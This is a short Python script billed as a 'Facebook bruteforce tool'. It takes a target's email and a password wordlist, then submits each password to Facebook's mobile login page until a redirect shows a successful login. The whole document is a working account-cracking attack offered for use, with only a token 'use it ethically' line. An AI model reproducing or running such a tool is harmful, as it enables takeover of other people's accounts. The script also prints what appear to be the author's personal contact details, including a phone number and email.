import requests
import os.path
import os
from os import path
from termcolor import colored, cprint
from pyfiglet import Figlet
import re

os.system('clear')
f = Figlet(font='big')
print(colored(f.renderText( 'FACEBOOK BRUTEFORCE TOOL' ), 'yellow'))
print_green = lambda x: cprint(x, 'green')
print_red = lambda x: cprint(x, 'red')
print_red("\t**********************************************")
print_red("\t*** MADE BY WISDOM UPEH ***")
print_red("\t**********************************************")
print_red("[+] =====use it ethically ===== [+]")
print_red("for any errors contact:\n" + "facebook: @turnerpeetahs\n" + "whatsapp: @+23408059225816\n" + "gmail: @wisdomupeh@gmail.com\n" + "github: @upeh\n")

umail = raw_input("enter target email:")
if '.com' and '@' in umail:
	word = raw_input('enter path to wordlist\n')
	exist = os.path.isfile(word)
	if exist == False:
		print("wordlist path does not exist")
		exit()
	else:
		url = 'https://m.facebook.com/login.php'
		print("Beginning to crack:" + umail)
		arq = open(word, 'r').readlines()
		for line in arq:
			password = line.strip()
			http = requests.post(url, data={'email':umail, 'pass':password, 'login':'Log In'}, allow_redirects=True)
			content = http.content
			d = http.cookies
			status = http.status_code
			sd = http.url
			if sd == 'https://m.facebook.com/home.php?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&_rdr':
				print_green("[+] Password found [+]")
				print_green("password is :" +password)
				break
			else:
				print("password is invalid:" +password) 
else:
	print("[+] Wrong email! [+]")
	exit()